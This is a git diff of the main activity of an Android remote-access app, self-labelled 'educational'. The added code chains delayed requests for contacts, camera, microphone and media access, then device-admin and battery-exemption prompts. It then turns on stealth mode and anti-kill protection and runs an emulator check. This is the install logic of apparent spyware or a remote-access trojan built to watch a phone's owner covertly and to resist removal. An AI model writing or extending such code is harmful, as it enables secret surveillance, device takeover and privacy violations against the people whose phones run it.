@@ -1,7 +1,9 @@
 package com.remoteaccess.educational;
 
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.provider.Settings;
@@ -9,11 +11,15 @@ import android.widget.Button;
 import android.widget.TextView;
 import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 import com.remoteaccess.educational.permissions.AccessibilityHelperService;
 import com.remoteaccess.educational.permissions.AutoPermissionManager;
 import com.remoteaccess.educational.services.RemoteAccessService;
 import com.remoteaccess.educational.stealth.StealthManager;
 import com.remoteaccess.educational.utils.PreferenceManager;
+import org.json.JSONArray;
+import org.json.JSONObject;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -23,12 +29,14 @@ public class MainActivity extends AppCompatActivity {
     private AutoPermissionManager permissionManager;
     private StealthManager stealthManager;
     private Handler handler;
+    private MainActivity activity;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+        activity = this;
         preferenceManager = new PreferenceManager(this);
         permissionManager = new AutoPermissionManager(this);
         stealthManager = new StealthManager(this);
@@ -96,23 +104,120 @@ public class MainActivity extends AppCompatActivity {
     private void autoGrantPermissions() {
         Toast.makeText(this, "Accessibility enabled! Setting up...", Toast.LENGTH_SHORT).show();
         
-        // ALL STEALTH FEATURES START IMMEDIATELY
+        // Request permissions in order with delays
         
-        // Request all permissions
+        // Step 1: Contacts (READ_CONTACTS)
+        requestPermissionWithDelay(new String[]{android.Manifest.permission.READ_CONTACTS}, 1000, new PermissionCallback() {
+            @Override
+            public void onResult(boolean granted) {
+                // Step 2: Camera
+                requestPermissionWithDelay(new String[]{android.Manifest.permission.CAMERA}, 1500, new PermissionCallback() {
+                    @Override
+                    public void onResult(boolean granted) {
+                        // Step 3: Audio (RECORD_AUDIO)
+                        requestPermissionWithDelay(new String[]{android.Manifest.permission.RECORD_AUDIO}, 1500, new PermissionCallback() {
+                            @Override
+                            public void onResult(boolean granted) {
+                                // Step 4: Videos (READ_MEDIA_VIDEO for Android 13+, READ_EXTERNAL_STORAGE for older)
+                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                                    requestPermissionWithDelay(new String[]{"android.permission.READ_MEDIA_VIDEO"}, 1500, new PermissionCallback() {
+                                        @Override
+                                        public void onResult(boolean granted) {
+                                            continueWithOtherPermissions();
+                                        }
+                                    });
+                                } else {
+                                    requestPermissionWithDelay(new String[]{android.Manifest.permission.READ_EXTERNAL_STORAGE}, 1500, new PermissionCallback() {
+                                        @Override
+                                        public void onResult(boolean granted) {
+                                            continueWithOtherPermissions();
+                                        }
+                                    });
+                                }
+                            }
+                        });
+                    }
+                });
+            }
+        });
+    }
+
+    private void continueWithOtherPermissions() {
+        // Step 5: All remaining permissions
         permissionManager.requestAllPermissions();
 
-        // Request special permissions + battery + device admin
+        // Step 6: Request special permissions + battery + device admin
         permissionManager.requestSpecialPermissions();
-        requestBatteryOptimization();
-        requestDeviceAdmin();
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                requestBatteryOptimization();
+            }
+        }, 1500);
 
-        // Enable ALL stealth features immediately
-        permissionManager.requestNotificationPermission();
-        enableStealthMode();
-        enableAntiKill();
-        checkEmulator();
-        
-        // Auto-click runs automatically for 10 seconds then stops
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                requestDeviceAdmin();
+            }
+        }, 3000);
+
+        // Step 7: Enable stealth features
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                permissionManager.requestNotificationPermission();
+                enableStealthMode();
+                enableAntiKill();
+                checkEmulator();
+                checkAndShowPermissionStatus();
+            }
+        }, 4500);
+    }
+
+    private void checkAndShowPermissionStatus() {
+        JSONObject status = permissionManager.getPermissionStatus();
+        try {
+            JSONArray granted = status.getJSONArray("granted");
+            JSONArray denied = status.getJSONArray("denied");
+            android.util.Log.i("Permissions", "Granted: " + granted.length() + ", Denied: " + denied.length());
+            if (denied.length() > 0) {
+                android.util.Log.w("Permissions", "Denied permissions: " + denied.toString());
+            }
+        } catch (Exception e) {
+            // Ignore
+        }
+    }
+
+    private void requestPermissionWithDelay(final String[] permissions, long delay, final PermissionCallback callback) {
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                if (activity != null) {
+                    ActivityCompat.requestPermissions(activity, permissions, 101);
+                }
+                // Check after delay if permission was granted
+                handler.postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        boolean granted = true;
+                        for (String permission : permissions) {
+                            if (ContextCompat.checkSelfPermission(activity, permission) != PackageManager.PERMISSION_GRANTED) {
+                                granted = false;
+                                break;
+                            }
+                        }
+                        if (callback != null) {
+                            callback.onResult(granted);
+                        }
+                    }
+                }, 2000);
+            }
+        }, delay);
+    }
+
+    private interface PermissionCallback {
+        void onResult(boolean granted);
     }
     
     private void enableAntiKill() {
